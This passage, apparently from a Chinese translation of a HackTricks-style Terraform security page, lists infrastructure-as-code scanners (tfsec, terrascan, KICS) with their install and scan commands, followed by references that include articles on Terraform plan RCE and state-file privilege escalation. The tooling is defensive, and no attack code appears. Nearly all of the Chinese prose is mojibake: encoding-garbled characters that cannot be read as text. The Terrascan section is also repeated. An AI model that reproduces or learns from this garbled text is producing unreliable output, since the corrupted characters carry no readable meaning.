- ğŸ› ï¸ å¯é…ç½®ï¼ˆé€šè¿‡ CLI æ ‡å¿—å’Œ/æˆ–é…ç½®æ–‡ä»¶ï¼‰
- âš¡ éå¸¸å¿«é€Ÿï¼Œèƒ½å¤Ÿå¿«é€Ÿæ‰«æå¤§å‹ä»“åº“
```bash
brew install tfsec
tfsec /path/to/folder
```
### [terrascan](https://github.com/tenable/terrascan)

Terrascan æ˜¯ä¸€ä¸ªé’ˆå¯¹åŸºç¡€è®¾æ–½å³ä»£ç ï¼ˆInfrastructure as Codeï¼‰çš„é™æ€ä»£ç åˆ†æå™¨ã€‚Terrascan å…è®¸æ‚¨ï¼š

- æ— ç¼æ‰«æåŸºç¡€è®¾æ–½å³ä»£ç ä¸­çš„é”™è¯¯é…ç½®ã€‚
- ç›‘æ§å·²éƒ¨ç½²çš„äº‘åŸºç¡€è®¾æ–½ä»¥å‘ç°å¯èƒ½å¼•èµ·å®‰å…¨æ€åŠ¿æ¼‚ç§»çš„é…ç½®æ›´æ”¹ï¼Œå¹¶æ”¯æŒæ¢å¤åˆ°å®‰å…¨æ€åŠ¿ã€‚
- æ£€æµ‹å®‰å…¨æ¼æ´å’Œåˆè§„æ€§è¿è§„ã€‚
- åœ¨ä¸ºäº‘åŸç”ŸåŸºç¡€è®¾æ–½é…ç½®èµ„æºä¹‹å‰ç¼“è§£é£é™©ã€‚
- å¯çµæ´»åœ¨æœ¬åœ°è¿è¡Œæˆ–ä¸æ‚¨çš„ CI\CD é›†æˆã€‚
```bash
brew install terrascan
terrascan scan -d /path/to/folder
```
### [KICKS](https://github.com/Checkmarx/kics)

åœ¨åŸºç¡€è®¾æ–½å³ä»£ç  (infrastructure-as-code) çš„å¼€å‘å‘¨æœŸæ—©æœŸï¼Œé€šè¿‡ Checkmarx çš„ **KICS** å‘ç°å®‰å…¨æ¼æ´ã€åˆè§„é—®é¢˜å’ŒåŸºç¡€è®¾æ–½é…ç½®é”™è¯¯ã€‚

**KICS** ä»£è¡¨ **K**eeping **I**nfrastructure as **C**ode **S**ecureï¼Œå®ƒæ˜¯å¼€æºçš„ï¼Œæ˜¯ä»»ä½•äº‘åŸç”Ÿé¡¹ç›®çš„å¿…å¤‡å·¥å…·ã€‚
```bash
docker run -t -v $(pwd):/path checkmarx/kics:latest scan -p /path -o "/path/"
```
### [Terrascan](https://github.com/tenable/terrascan)

From the [**docs**](https://github.com/tenable/terrascan)ï¼šTerrascan æ˜¯ä¸€ä¸ªç”¨äºåŸºç¡€è®¾æ–½å³ä»£ç çš„é™æ€ä»£ç åˆ†æå™¨ã€‚Terrascan å…è®¸ä½ ï¼š

- æ— ç¼æ‰«æåŸºç¡€è®¾æ–½å³ä»£ç ä»¥å‘ç°é…ç½®é”™è¯¯ã€‚
- ç›‘æ§å·²é…ç½®çš„äº‘åŸºç¡€è®¾æ–½ä»¥å‘ç°å¼•å…¥å®‰å…¨æ€åç§»çš„é…ç½®æ›´æ”¹ï¼Œå¹¶æ”¯æŒæ¢å¤åˆ°å®‰å…¨é…ç½®ã€‚
- æ£€æµ‹å®‰å…¨æ¼æ´å’Œåˆè§„æ€§è¿è§„ã€‚
- åœ¨éƒ¨ç½²äº‘åŸç”ŸåŸºç¡€è®¾æ–½ä¹‹å‰ç¼“è§£é£é™©ã€‚
- æä¾›åœ¨æœ¬åœ°è¿è¡Œæˆ–ä¸ä½ çš„ CI\CD é›†æˆçš„çµæ´»æ€§ã€‚
```bash
brew install terrascan
```
## å‚è€ƒèµ„æ–™

- [Atlantis Security](atlantis-security.md)
- [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
- [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
- [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)
- [https://github.com/offensive-actions/terraform-provider-statefile-rce](https://github.com/offensive-actions/terraform-provider-statefile-rce)
- [Terraform Cloud token abuse turns speculative plan into remote code execution](https://www.pentestpartners.com/security-blog/terraform-token-abuse-speculative-plan/)
- [Terraform Cloud æƒé™](https://developer.hashicorp.com/terraform/cloud-docs/users-teams-organizations/permissions)
- [Terraform Cloud API â€“ æ˜¾ç¤º workspace](https://developer.hashicorp.com/terraform/cloud-docs/api-docs/workspaces#show-workspace)
- [AWS provider é…ç½®](https://registry.terraform.io/providers/hashicorp/aws/latest/docs#provider-configuration)
- [AWS CLI â€“ OIDC è§’è‰²å‡è®¾](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-role.html#cli-configure-role-oidc)
- [GCP provider â€“ åœ¨ Terraform Cloud ä¸­ä½¿ç”¨](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider_reference.html#using-terraform-cloud)
- [Terraform â€“ æ•æ„Ÿå˜é‡](https://developer.hashicorp.com/terraform/tutorials/configuration-language/sensitive-variables)
- [Snyk Labs â€“ Gitflopsï¼šTerraform è‡ªåŠ¨åŒ–å¹³å°çš„å±é™©](https://labs.snyk.io/resources/gitflops-dangers-of-terraform-automation-platforms/)

{{#include ../banners/hacktricks-training.md}}
